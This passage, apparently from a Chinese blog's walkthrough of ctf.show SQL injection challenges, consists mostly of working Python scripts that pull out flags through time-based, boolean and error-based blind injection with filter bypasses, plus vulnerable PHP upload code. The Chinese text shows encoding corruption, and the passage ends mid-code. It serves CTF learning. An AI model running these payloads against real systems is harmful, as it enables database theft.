punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token punctuation">.</span>element<span class="token punctuation">;</span>  element<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'api/'</span><span class="token punctuation">,</span>      <span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>      <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>      <span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">ip</span><span class="token operator">:</span>returnCitySN<span class="token punctuation">[</span><span class="token string">"cip"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token literal-property property">debug</span><span class="token operator">:</span><span class="token number">0</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°æäº¤çš„è¡¨å•ä¸­æœ‰ä¸¤ä¸ªå˜é‡ï¼Œæµ‹è¯•ä¸€ä¸‹</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-12">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-12</a> 14.27.34.png)</p><p>æµ‹è¯•æˆåŠŸï¼Œå¼€å§‹ç¼–å†™ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,qwertyuiopasdfghjklzxcvbnm_1234567890"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagx"),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(3),1)'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>215</strong></p><p>å•å¼•å·é—­åˆ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,flagqwertyuiopsdhjkzxcvbnm_1234567890"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'1\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)#',</span><span class="token comment">#'ip': f'1\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxc"),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)#',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(3),1)#'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>216</strong></p><p>base64ç¼–ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,ctfshowlagbde1234567890"</span>namechar<span class="token operator">=</span><span class="token string">",ctfshow_qwertyuiopasdfghjklzxcvbnm"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'"MQ==") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))="&#123;j&#125;",sleep(2),1)#',</span><span class="token comment">#'ip': f'"MQ==") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxcc"),&#123;i&#125;,1))="&#123;j&#125;",sleep(2),1)#',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'"MQ==") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(2),1)#'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>217</strong></p><p>sleepä¸èƒ½ç”¨äº†å•¦ï¼Œéƒ½ctfshowå®³å¾—å•¦ï¼Œæ‹œæ‰˜ï¼Œæ¢benchmark</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show&#x2F;api&#x2F;&quot;flagchar &#x3D; &quot;-&#123;&#125;,ctfshowlagbde1234567890&quot;namechar &#x3D; &quot;,ctfshow_qwertyuiopasdfghjklzxcvbnm&quot;for i in range(1, 1000):    for j in flagchar:        data &#x3D; &#123;            #&#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            #&#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;ctfshow_flagxccb&quot;),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            &#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            &#39;debug&#39;: &#39;1&#39;        &#125;        try:            requests.post(url&#x3D;url, data&#x3D;data, timeout&#x3D;4)        except:            print(j, end&#x3D;&#39;&#39;)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>218</strong></p><p>benchmarkä¹ŸğŸˆšï¸äº†ï¼Œæ¢ç¬›å¡å°”ç§¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/"</span>flagchar <span class="token operator">=</span> <span class="token string">"-&#123;&#125;,abcdef1234567890"</span>namechar <span class="token operator">=</span> <span class="token string">",ctfshow_qwertyuiopasdfghjklzxcvbnm"</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token comment">#'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))=\'&#123;j&#125;\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',</span>                <span class="token comment">#'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxc"),&#123;i&#125;,1))=\'&#123;j&#125;\'),(benchmark(20000000,sha(1))),1)#',</span>                <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=\'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#'</span></span><span class="token punctuation">,</span>                <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>219</strong></p><p>è¿‡æ»¤äº†rlikeï¼Œç¬›å¡å°”ç§¯ä¾ç„¶å¯ç”¨ï¼ŒåŒä¸Šå³å¯</p><p><strong>220</strong></p><p>sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr</p><p>çœŸèƒ½æ»¤ï¼Œæ¢left</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show&#x2F;api&#x2F;&quot;flagchar &#x3D; &quot;ctfshow-&#123;&#125;,abde1234567890&quot;namechar &#x3D; &quot;flag,ctfshow_qwertyuiopasdfghjklzxcvbnm&quot;flag&#x3D;&quot;&quot;for k in range(10):    print()    flag &#x3D; &quot;&quot;    for i in range(1, 50):        for j in flagchar:            tmp&#x3D;flag+j            data &#x3D; &#123;                &#39;ip&#39;: f&#39;1) or if((left((select flagaabcc from ctfshow_flagxcac),&#123;i&#125;)&#x3D;\&#39;&#123;tmp&#125;\&#39;),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#&#39;,                &#39;debug&#39;: &#39;1&#39;            &#125;            try:                requests.post(url&#x3D;url, data&#x3D;data, timeout&#x3D;4)            except:                flag&#x3D;tmp                print(j,end&#x3D;&quot;&quot;)                break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ—¶é—´ç›²æ³¨ï¼Œç»“æŸ</p><p><strong>221</strong></p><p>limitæ³¨å…¥ï¼Œæ¬¢è¿æ”¶çœ‹Pç¥åšå®¢</p><p>æŠ¥é”™æ³¨å…¥</p><pre class="line-numbers language-none"><code class="language-none">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>222</strong></p><p>Group_byåé¢çš„å‚æ•°æ¥è¿›è¡Œå¸ƒå°”æ³¨å…¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://debba94a-3e3c-4b9e-97e0-27c6e7381dde.challenge.ctf.show/api/?u="</span>ca<span class="token operator">=</span><span class="token string">"ctfshow&#123;1234567890-abcdef&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> ca<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'if(substr((select group_concat(flagaabc) from ctfshow_flaga),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">","username",cot(0))'</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>223</strong></p><p>è¿‡æ»¤äº†æ•°å­—ï¼Œè´´ä¸ªå¤§ä½¬è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Kradress</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/"</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">dict</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"_-,&#125;&#123;"</span><span class="token comment"># çˆ†è¡¨å  </span><span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><span class="token comment"># çˆ†åˆ—å</span><span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'"</span><span class="token comment">#çˆ†å­—æ®µå€¼</span>payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span><span class="token keyword">def</span> <span class="token function">numToStr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>numToStr2<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"concat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token keyword">def</span> <span class="token function">numToStr2</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    n <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'u'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat(if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>numToStr<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,true)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>numToStr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,username,cot(false)))#"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token comment"># print(r.url)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>224</strong></p><p>é€šè¿‡æ–‡ä»¶ä¿¡æ¯çš„æ³¨å…¥ï¼Œè¿™é‡Œæœ‰é¢–å¸ˆå‚…çš„<a href="https://blog.gem-love.com/ctf/2283.html">åšå®¢</a></p><blockquote><p>ä½†æ˜¯å‘ç°è¿™ä¸ª<code>file()</code>æ–¹æ³•å¯ä»¥æ£€æµ‹å›¾ç‰‡çš„EXIFä¿¡æ¯ï¼Œè€ŒEXIFä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªcommentå­—æ®µï¼Œç›¸å½“äºå›¾ç‰‡æ³¨é‡Šï¼Œè€Œ<code>finfo-&gt;file()</code>æ­£å¥½èƒ½å¤Ÿè¾“å‡ºè¿™ä¸ªä¿¡æ¯ï¼Œå¦‚æœä¸Šé¢çš„å‡è®¾æˆç«‹ï¼Œè¿™å°±å¯ä»¥é€ æˆSQLæ³¨å…¥</p></blockquote><p>å†åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œå»æ‹¿ä¸€ä¸ªæºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ–‡ä»¶è¿‡å¤§: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token 